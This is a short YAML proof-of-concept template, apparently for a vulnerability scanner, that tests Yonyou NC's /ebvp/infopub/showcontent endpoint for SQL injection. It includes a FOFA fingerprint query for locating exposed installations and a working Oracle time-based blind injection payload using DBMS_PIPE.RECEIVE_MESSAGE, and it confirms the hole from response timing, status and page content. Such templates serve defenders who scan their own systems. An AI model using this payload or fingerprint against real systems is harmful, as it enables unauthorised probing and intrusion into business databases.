id: poc-yaml-yongyou-nc-showcontent-sqli
info:
  name: 用友 NC showcontent SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友NC
  fofa: app="用友-UFIDA-NC"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /ebvp/infopub/showcontent?id=1'+AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,{{.t1}})--
  expression: "status_code == 500 && \ncontains(title,\"Yonyou NC\") &&\ncontains(body,\"\
    /ebvp/\") &&\nduration > t1 &&\nduration < t2\n"
transport: http
